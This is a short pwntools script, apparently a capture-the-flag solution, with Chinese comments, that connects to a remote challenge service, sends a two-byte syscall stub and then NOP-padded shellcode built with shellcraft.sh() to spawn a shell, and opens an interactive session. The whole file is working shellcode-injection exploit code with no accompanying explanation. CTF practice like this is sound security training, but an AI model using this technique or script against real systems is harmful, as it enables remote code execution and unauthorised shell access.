from pwn import *
#p = process('./attachment')
p = remote("gz.imxbt.cn",20384)
context.arch='amd64'

# gdb.attach(p,'b $rebase(0x1255)')

shellcode = asm("syscall") # 即'\x0f\x05'
p.send(shellcode)

shellcode = b'\x90'*2 + asm(shellcraft.sh()) # '\x90'为nop的汇编，覆盖掉之前的syscall
p.send(shellcode)

p.interactive()



